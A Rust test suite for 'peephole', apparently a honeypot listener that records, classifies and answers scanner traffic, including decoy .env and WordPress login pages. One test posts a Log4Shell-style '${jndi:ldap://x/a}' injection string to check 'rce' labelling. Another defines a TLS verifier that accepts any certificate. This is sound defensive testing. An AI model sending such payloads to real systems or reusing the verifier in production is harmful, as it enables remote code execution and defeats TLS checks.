//! What the trap listener records and answers: body cap, pseudo-headers,
//! flood sampling, decoys, helper prefix, /collect attribution and errors.
use peephole::config::Config;
use peephole::store::Store;
use peephole::trap::{self, TrapState};
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

/// A trap behind a trusted proxy at 127.0.0.1, with `extra` appended to the
/// config (e.g. a `[trap]` section).
async fn spawn(extra: &str) -> (String, Store, tempfile::TempDir) {
    let dir = tempfile::tempdir().unwrap();
    let cfg_text = format!(
        r#"
trap_listen = "127.0.0.1:0"
database_path = "{db}"
data_dir = "{d}"
rules_dir = "rules"
trusted_proxies = ["127.0.0.1/32"]
[roles]
web = false
{extra}
"#,
        db = dir.path().join("t.db").display(),
        d = dir.path().display()
    );
    let cfg_path = dir.path().join("c.toml");
    std::fs::write(&cfg_path, cfg_text).unwrap();
    let cfg = Config::load(&cfg_path).unwrap();
    let store = Store::connect(&cfg.database_path).await.unwrap();
    let app = trap::router(Arc::new(TrapState::for_test(store.clone(), cfg)));
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        axum::serve(
            listener,
            app.into_make_service_with_connect_info::<std::net::SocketAddr>(),
        )
        .await
        .unwrap()
    });
    (format!("http://{addr}"), store, dir)
}

async fn count(store: &Store, sql: &str) -> i64 {
    sqlx::query_scalar(sqlx::AssertSqlSafe(sql.to_string()))
        .fetch_one(&store.pool)
        .await
        .unwrap()
}

/// The stored headers of the newest request.
async fn last_headers(store: &Store) -> Vec<(String, String)> {
    let h: String =
        sqlx::query_scalar("SELECT headers_json FROM requests ORDER BY id DESC LIMIT 1")
            .fetch_one(&store.pool)
            .await
            .unwrap();
    serde_json::from_str(&h).unwrap()
}

fn header<'a>(h: &'a [(String, String)], name: &str) -> Option<&'a str> {
    h.iter().find(|(k, _)| k == name).map(|(_, v)| v.as_str())
}

#[tokio::test]
async fn oversized_body_is_recorded_truncated_not_refused() {
    let (base, store, _dir) = spawn("").await;
    let mut body = b"payload=${jndi:ldap://x/a}&pad=".to_vec();
    body.resize(200_000, b'a');
    let resp = reqwest::Client::new()
        .post(format!("{base}/upload"))
        .header("x-forwarded-for", "203.0.113.7")
        .body(body)
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 404);
    assert!(
        resp.text()
            .await
            .unwrap()
            .contains("route which does not exist")
    );
    let (len, labels): (i64, String) =
        sqlx::query_as("SELECT length(body), labels_json FROM requests")
            .fetch_one(&store.pool)
            .await
            .unwrap();
    assert_eq!(len, 64 * 1024);
    // The kept part is still classified.
    assert!(labels.contains("rce"), "{labels}");
    let h = last_headers(&store).await;
    assert_eq!(header(&h, ":body-truncated"), Some("200000"));
    assert_eq!(header(&h, "content-length"), Some("200000"));

    // A body within the cap is stored whole, without the marker.
    reqwest::Client::new()
        .post(format!("{base}/upload"))
        .header("x-forwarded-for", "203.0.113.7")
        .body("a=1")
        .send()
        .await
        .unwrap();
    let h = last_headers(&store).await;
    assert_eq!(header(&h, ":body-truncated"), None);
    assert_eq!(header(&h, ":version"), Some("HTTP/1.1"));
}

#[tokio::test]
async fn absolute_form_target_is_recorded_as_proxy_probe() {
    let (base, store, _dir) = spawn("").await;
    let addr = base.trim_start_matches("http://");
    let mut s = tokio::net::TcpStream::connect(addr).await.unwrap();
    s.write_all(
        b"GET http://example.com/check?x=1 HTTP/1.1\r\nHost: example.com\r\n\
          X-Forwarded-For: 203.0.113.8\r\nConnection: close\r\n\r\n",
    )
    .await
    .unwrap();
    let mut out = String::new();
    s.read_to_string(&mut out).await.unwrap();
    assert!(out.starts_with("HTTP/1.1 404"), "{out}");
    let h = last_headers(&store).await;
    assert_eq!(header(&h, ":authority"), Some("example.com"));
    let (path, query, labels): (String, Option<String>, String) =
        sqlx::query_as("SELECT path, query, labels_json FROM requests")
            .fetch_one(&store.pool)
            .await
            .unwrap();
    assert_eq!((path.as_str(), query.as_deref()), ("/check", Some("x=1")));
    assert!(labels.contains("proxy-probe"), "{labels}");

    // An origin-form request names no authority.
    reqwest::Client::new()
        .get(format!("{base}/plain"))
        .header("x-forwarded-for", "203.0.113.8")
        .send()
        .await
        .unwrap();
    let h = last_headers(&store).await;
    assert_eq!(header(&h, ":authority"), None);
}

#[tokio::test]
async fn a_flood_from_one_ip_is_answered_but_sampled() {
    let (base, store, _dir) =
        spawn("[trap]\nrecord_rate = 0.001\nrecord_burst = 3\nsample_every = 5\n").await;
    let client = reqwest::Client::new();
    for i in 0..13 {
        let resp = client
            .get(format!("{base}/p{i}"))
            .header("x-forwarded-for", "203.0.113.9")
            .send()
            .await
            .unwrap();
        assert_eq!(resp.status(), 404, "request {i}");
        assert!(
            resp.text()
                .await
                .unwrap()
                .contains("route which does not exist")
        );
    }
    // 3 within the burst, then 1 in 5 of the 10 over it.
    assert_eq!(count(&store, "SELECT COUNT(*) FROM requests").await, 5);
    let n: Option<i64> =
        sqlx::query_scalar("SELECT unrecorded FROM requests ORDER BY id DESC LIMIT 1")
            .fetch_one(&store.pool)
            .await
            .unwrap();
    assert_eq!(n, Some(4));
    let h = last_headers(&store).await;
    assert_eq!(
        header(&h, ":unrecorded"),
        None,
        "a column now, not a header"
    );
    // Another address is not held back by it.
    client
        .get(format!("{base}/other"))
        .header("x-forwarded-for", "203.0.113.10")
        .send()
        .await
        .unwrap();
    assert_eq!(count(&store, "SELECT COUNT(*) FROM requests").await, 6);
}

#[tokio::test]
async fn the_hour_counts_include_the_current_request() {
    let (base, store, _dir) = spawn("").await;
    let client = reqwest::Client::new();
    // path-scanner from the 20th request in an hour on.
    for _ in 0..19 {
        client
            .get(format!("{base}/same"))
            .header("x-forwarded-for", "203.0.113.11")
            .send()
            .await
            .unwrap();
    }
    let labels: String =
        sqlx::query_scalar("SELECT labels_json FROM requests ORDER BY id DESC LIMIT 1")
            .fetch_one(&store.pool)
            .await
            .unwrap();
    assert!(!labels.contains("path-scanner"), "{labels}");
    client
        .get(format!("{base}/same"))
        .header("x-forwarded-for", "203.0.113.11")
        .send()
        .await
        .unwrap();
    let labels: String =
        sqlx::query_scalar("SELECT labels_json FROM requests ORDER BY id DESC LIMIT 1")
            .fetch_one(&store.pool)
            .await
            .unwrap();
    assert!(labels.contains("path-scanner"), "{labels}");
}

#[tokio::test]
async fn decoys_are_opt_in() {
    let (base, store, _dir) = spawn("").await;
    let resp = reqwest::get(format!("{base}/.env")).await.unwrap();
    assert_eq!(resp.status(), 404);

    let (base, store2, _dir2) = spawn("[trap]\ndecoys = true\n").await;
    let resp = reqwest::get(format!("{base}/.env")).await.unwrap();
    assert_eq!(resp.status(), 200);
    assert!(
        resp.headers()["content-type"]
            .to_str()
            .unwrap()
            .starts_with("text/plain")
    );
    let text = resp.text().await.unwrap();
    // The canary names the request it was served to.
    let token: String = sqlx::query_scalar("SELECT page_token FROM requests")
        .fetch_one(&store2.pool)
        .await
        .unwrap();
    let canary = format!("canary-{}", &token.replace('-', "")[..12]);
    assert!(text.contains(&format!("DB_PASSWORD={canary}")), "{text}");
    let resp = reqwest::get(format!("{base}/wp-login.php")).await.unwrap();
    assert_eq!(resp.status(), 200);
    assert!(resp.text().await.unwrap().contains("name=\"pwd\""));
    // Other paths still get the trap page.
    let resp = reqwest::get(format!("{base}/nothing-here")).await.unwrap();
    assert_eq!(resp.status(), 404);
    assert_eq!(count(&store, "SELECT COUNT(*) FROM requests").await, 1);
    assert_eq!(count(&store2, "SELECT COUNT(*) FROM requests").await, 3);
}

#[tokio::test]
async fn helper_endpoints_move_under_the_prefix() {
    let (base, store, _dir) = spawn("[trap]\nhelper_prefix = \"/_h7\"\n").await;
    let page = reqwest::get(format!("{base}/x"))
        .await
        .unwrap()
        .text()
        .await
        .unwrap();
    assert!(page.contains("src=\"/_h7/collect.js\""), "{page}");
    assert!(page.contains("action=\"/_h7/claim\""));
    assert!(page.contains("PEEPHOLE_BASE = \"/_h7\""));
    let js = reqwest::get(format!("{base}/_h7/collect.js"))
        .await
        .unwrap();
    assert_eq!(js.status(), 200);
    assert!(js.text().await.unwrap().contains("BASE + \"/collect\""));
    // The old path is just another trapped request.
    let old = reqwest::get(format!("{base}/collect.js")).await.unwrap();
    assert_eq!(old.status(), 404);
    assert_eq!(count(&store, "SELECT COUNT(*) FROM requests").await, 2);
    let resp = reqwest::Client::new()
        .post(format!("{base}/_h7/claim"))
        .form(&[("email", "")])
        .send()
        .await
        .unwrap();
    assert!(resp.status().is_success());
    assert_eq!(count(&store, "SELECT COUNT(*) FROM fp_claims").await, 1);
}

#[tokio::test]
async fn collect_escalates_only_the_address_the_page_was_served_to() {
    let (base, store, _dir) = spawn("").await;
    let client = reqwest::Client::new();
    let page = |ip: &'static str| {
        let client = client.clone();
        let base = base.clone();
        async move {
            let html = client
                .get(format!("{base}/page"))
                .header("x-forwarded-for", ip)
                .send()
                .await
                .unwrap()
                .text()
                .await
                .unwrap();
            let start = html.find("PEEPHOLE_TOKEN = \"").unwrap() + 18;
            html[start..start + 36].to_string()
        }
    };
    let collect = |ip: &'static str, token: String| {
        let client = client.clone();
        let base = base.clone();
        async move {
            client
                .post(format!("{base}/collect"))
                .header("x-forwarded-for", ip)
                .json(&serde_json::json!({
                    "token": token,
                    "attrs": {"webdriver": true, "ua": "x"},
                    "behavior": {"automation": {"webdriver": true}},
                }))
                .send()
                .await
                .unwrap();
        }
    };
    let level = |ip: &'static str| {
        let pool = store.pool.clone();
        async move {
            sqlx::query_scalar::<_, i64>(
                "SELECT MAX(j.level) FROM scan_jobs j JOIN ips i ON i.id = j.ip_id WHERE i.ip = ?",
            )
            .bind(ip)
            .fetch_one(&pool)
            .await
            .unwrap_or(0)
        }
    };

    // Beacon from another address: stored, linked, but no escalation.
    let t = page("203.0.113.20").await;
    assert_eq!(level("203.0.113.20").await, 1);
    collect("203.0.113.21", t).await;
    assert_eq!(level("203.0.113.20").await, 1);
    assert_eq!(level("203.0.113.21").await, 0);
    assert_eq!(
        count(
            &store,
            "SELECT COUNT(*) FROM fingerprints WHERE request_id IS NOT NULL"
        )
        .await,
        1
    );

    // Beacon from the page's own address: escalated.
    let t = page("203.0.113.22").await;
    collect("203.0.113.22", t).await;
    assert_eq!(level("203.0.113.22").await, 2);
}

#[tokio::test]
async fn a_failed_write_still_gets_the_trap_page() {
    let (base, store, _dir) = spawn("").await;
    sqlx::query(
        "CREATE TRIGGER fail_requests BEFORE INSERT ON requests
         BEGIN SELECT RAISE(ABORT, 'database is locked'); END",
    )
    .execute(&store.pool)
    .await
    .unwrap();
    let resp = reqwest::Client::new()
        .get(format!("{base}/anything"))
        .header("x-forwarded-for", "203.0.113.30")
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 404);
    assert!(
        resp.text()
            .await
            .unwrap()
            .contains("route which does not exist")
    );
    assert_eq!(count(&store, "SELECT COUNT(*) FROM requests").await, 0);
}

#[tokio::test]
async fn answer_and_status_are_recorded() {
    let (base, store, _dir) = spawn("[trap]\ndecoys = true\n").await;
    let client = reqwest::Client::new();
    for p in ["/.env", "/nothing", "/wp-login.php"] {
        client.get(format!("{base}{p}")).send().await.unwrap();
    }
    client
        .post(format!("{base}/wp-login.php"))
        .form(&[("log", "a"), ("pwd", "b")])
        .send()
        .await
        .unwrap();
    client
        .post(format!("{base}/claim"))
        .form(&[("email", "")])
        .send()
        .await
        .unwrap();
    let rows: Vec<(Option<String>, Option<i64>)> =
        sqlx::query_as("SELECT answer, status FROM requests ORDER BY id")
            .fetch_all(&store.pool)
            .await
            .unwrap();
    assert_eq!(
        rows,
        vec![
            (Some("decoy:dotenv".into()), Some(200)),
            (Some("not-found".into()), Some(404)),
            (Some("decoy:wp-login".into()), Some(200)),
            (Some("decoy:wp-login-failed".into()), Some(200)),
            (Some("claim".into()), Some(200)),
        ]
    );
}

#[tokio::test]
async fn every_answered_request_is_a_row_a_light_row_or_counted() {
    let (base, store, _dir) =
        spawn("[trap]\nrecord_rate = 1\nrecord_burst = 1\nsample_every = 0\nskip_log_rate = 5\n")
            .await;
    let client = reqwest::Client::new();
    let send = |i: usize| {
        client
            .get(format!("{base}/p{i}"))
            .header("x-forwarded-for", "203.0.113.9")
            .send()
    };
    for i in 0..50 {
        assert_eq!(send(i).await.unwrap().status(), 404);
    }
    // A token again: this one is recorded and writes the pending batch.
    tokio::time::sleep(std::time::Duration::from_millis(1100)).await;
    send(50).await.unwrap();
    let full = count(&store, "SELECT COUNT(*) FROM requests").await;
    let light = count(&store, "SELECT COUNT(*) FROM skipped_requests").await;
    let dropped = count(
        &store,
        "SELECT COALESCE(SUM(dropped), 0) FROM skipped_batches",
    )
    .await;
    assert_eq!(full, 2);
    assert!(light >= 5, "light rows: {light}");
    assert_eq!(full + light + dropped, 51);
    let paths: Vec<String> =
        sqlx::query_scalar("SELECT path FROM skipped_requests ORDER BY ts_ms LIMIT 2")
            .fetch_all(&store.pool)
            .await
            .unwrap();
    assert_eq!(paths, ["/p1", "/p2"]);
    let unrecorded: Option<i64> =
        sqlx::query_scalar("SELECT unrecorded FROM requests ORDER BY id DESC LIMIT 1")
            .fetch_one(&store.pool)
            .await
            .unwrap();
    assert_eq!(unrecorded, Some(light + dropped));
}

/// Accepts any server certificate (the trap's is self-signed).
#[derive(Debug)]
struct AnyCert;

impl rustls::client::danger::ServerCertVerifier for AnyCert {
    fn verify_server_cert(
        &self,
        _: &rustls::pki_types::CertificateDer<'_>,
        _: &[rustls::pki_types::CertificateDer<'_>],
        _: &rustls::pki_types::ServerName<'_>,
        _: &[u8],
        _: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }
    fn verify_tls12_signature(
        &self,
        _: &[u8],
        _: &rustls::pki_types::CertificateDer<'_>,
        _: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }
    fn verify_tls13_signature(
        &self,
        _: &[u8],
        _: &rustls::pki_types::CertificateDer<'_>,
        _: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }
    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        rustls::crypto::aws_lc_rs::default_provider()
            .signature_verification_algorithms
            .supported_schemes()
    }
}

fn tls_client() -> tokio_rustls::TlsConnector {
    let cfg = rustls::ClientConfig::builder_with_provider(Arc::new(
        rustls::crypto::aws_lc_rs::default_provider(),
    ))
    .with_safe_default_protocol_versions()
    .unwrap()
    .dangerous()
    .with_custom_certificate_verifier(Arc::new(AnyCert))
    .with_no_client_auth();
    tokio_rustls::TlsConnector::from(Arc::new(cfg))
}

/// Both trap listeners as the binary runs them: plain and TLS, with
/// `trusted` as trusted_proxies. Returns (plain addr, tls addr, store).
async fn spawn_listeners(
    trusted: &str,
) -> (
    std::net::SocketAddr,
    std::net::SocketAddr,
    Store,
    tempfile::TempDir,
    tokio::sync::watch::Sender<bool>,
) {
    let dir = tempfile::tempdir().unwrap();
    let cfg_text = format!(
        r#"
trap_listen = "127.0.0.1:0"
trap_tls_listen = "127.0.0.1:0"
database_path = "{db}"
data_dir = "{d}"
rules_dir = "rules"
trusted_proxies = [{trusted}]
[roles]
web = false
"#,
        db = dir.path().join("t.db").display(),
        d = dir.path().display()
    );
    let cfg_path = dir.path().join("c.toml");
    std::fs::write(&cfg_path, cfg_text).unwrap();
    let cfg = Config::load(&cfg_path).unwrap();
    let store = Store::connect(&cfg.database_path).await.unwrap();
    let trusted = Arc::new(cfg.trusted_proxies.clone());
    let app = trap::router(Arc::new(TrapState::for_test(store.clone(), cfg)));
    let tls = trap::listen::trap_tls_config(None, None).unwrap();
    let (stop, rx) = tokio::sync::watch::channel(false);
    let plain = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let secure = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let (pa, sa) = (plain.local_addr().unwrap(), secure.local_addr().unwrap());
    tokio::spawn(trap::listen::serve_trap(
        plain,
        app.clone(),
        None,
        trusted.clone(),
        rx.clone(),
    ));
    tokio::spawn(trap::listen::serve_trap(
        secure,
        app,
        Some(tls),
        trusted,
        rx,
    ));
    (pa, sa, store, dir, stop)
}

/// Send a raw HTTP/1.1 request over `io` and read the answer to the end.
async fn raw_request<S: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin>(
    io: &mut S,
    head: &str,
) -> String {
    io.write_all(head.as_bytes()).await.unwrap();
    let mut out = vec![];
    let _ = io.read_to_end(&mut out).await;
    String::from_utf8_lossy(&out).into_owned()
}

#[tokio::test]
async fn https_request_records_ja4_hello_and_raw_head() {
    let (_p, s, store, _d, _stop) = spawn_listeners("").await;
    let tcp = tokio::net::TcpStream::connect(s).await.unwrap();
    let name = rustls::pki_types::ServerName::try_from("probe.test").unwrap();
    let mut tls = tls_client().connect(name, tcp).await.unwrap();
    let head = "GET /x HTTP/1.1\r\nHost: probe.test\r\nX-Mixed-Case: 1\r\n\r\n";
    let answer = raw_request(&mut tls, head).await;
    assert!(answer.starts_with("HTTP/1.1 404"), "{answer}");
    let (transport, via, ja4, hello, raw): (String, bool, String, Vec<u8>, Vec<u8>) =
        sqlx::query_as(
            "SELECT transport, via_proxy, ja4, tls_client_hello, raw_head FROM requests",
        )
        .fetch_one(&store.pool)
        .await
        .unwrap();
    assert_eq!(transport, "https");
    assert!(!via);
    assert!(ja4.starts_with("t13d"), "{ja4}");
    assert_eq!(hello[0], 0x16);
    assert_eq!(raw, head.as_bytes());
}

#[tokio::test]
async fn a_proxy_header_from_a_trusted_peer_names_the_client() {
    let (_p, s, store, _d, _stop) = spawn_listeners(r#""127.0.0.1/32""#).await;
    let mut tcp = tokio::net::TcpStream::connect(s).await.unwrap();
    tcp.write_all(b"PROXY TCP4 203.0.113.9 127.0.0.1 5555 443\r\n")
        .await
        .unwrap();
    let name = rustls::pki_types::ServerName::try_from("probe.test").unwrap();
    let mut tls = tls_client().connect(name, tcp).await.unwrap();
    raw_request(
        &mut tls,
        "GET /p HTTP/1.1\r\nHost: probe.test\r\nX-Forwarded-For: 198.51.100.1\r\n\r\n",
    )
    .await;
    let (ip, via): (String, bool) =
        sqlx::query_as("SELECT i.ip, r.via_proxy FROM requests r JOIN ips i ON i.id = r.ip_id")
            .fetch_one(&store.pool)
            .await
            .unwrap();
    assert_eq!(ip, "203.0.113.9", "the PROXY source, not X-Forwarded-For");
    assert!(via);
}

#[tokio::test]
async fn a_trusted_peer_without_a_proxy_header_is_dropped() {
    let (_p, s, store, _d, _stop) = spawn_listeners(r#""127.0.0.1/32""#).await;
    let tcp = tokio::net::TcpStream::connect(s).await.unwrap();
    let name = rustls::pki_types::ServerName::try_from("probe.test").unwrap();
    assert!(tls_client().connect(name, tcp).await.is_err());
    let mut garbage = tokio::net::TcpStream::connect(s).await.unwrap();
    garbage.write_all(b"PROXY NONSENSE\r\n").await.unwrap();
    let mut out = vec![];
    let _ = garbage.read_to_end(&mut out).await;
    assert!(out.is_empty());
    assert_eq!(count(&store, "SELECT COUNT(*) FROM requests").await, 0);
}

#[tokio::test]
async fn the_plain_listener_records_the_raw_head() {
    let (p, _s, store, _d, _stop) = spawn_listeners(r#""127.0.0.1/32""#).await;
    let mut tcp = tokio::net::TcpStream::connect(p).await.unwrap();
    let head =
        "GET /a HTTP/1.1\r\nHost: x\r\nUser-AGENT: Q\r\nX-Forwarded-For: 203.0.113.5\r\n\r\n";
    let answer = raw_request(&mut tcp, head).await;
    assert!(
        answer.contains("onnection: close"),
        "one request per connection: {answer}"
    );
    let (transport, via, raw, ja4): (String, bool, Vec<u8>, Option<String>) =
        sqlx::query_as("SELECT transport, via_proxy, raw_head, ja4 FROM requests")
            .fetch_one(&store.pool)
            .await
            .unwrap();
    assert_eq!((transport.as_str(), via, ja4), ("http", true, None));
    assert_eq!(raw, head.as_bytes());
}
